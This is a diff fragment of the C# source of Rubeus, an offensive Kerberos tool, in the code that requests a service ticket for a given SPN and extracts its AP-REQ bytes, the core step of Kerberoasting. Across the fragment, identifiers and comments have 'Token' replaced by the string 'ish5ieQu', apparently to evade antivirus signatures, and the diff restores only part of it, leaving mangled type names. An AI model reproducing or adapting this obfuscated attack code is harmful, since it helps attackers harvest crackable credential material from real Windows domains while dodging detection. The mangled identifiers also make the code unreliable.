@@ -707,14 +707,14 @@ namespace Rubeus
             {
                 // the System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu approach and extraction of the AP-REQ from the
                 //  GetRequest() stream was constributed to PowerView by @machosec
-                System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu ticket;
+                System.IdentityModel.Tokens.KerberosRequestorSecurityish5ieQu ticket;
                 if (cred != null)
                 {
-                    ticket = new System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu(spn, ish5ieQuImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
+                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityish5ieQu(spn, ish5ieQuImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                 }
                 else
                 {
-                    ticket = new System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu(spn);
+                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityish5ieQu(spn);
                 }
                 byte[] requestBytes = ticket.GetRequest();
 
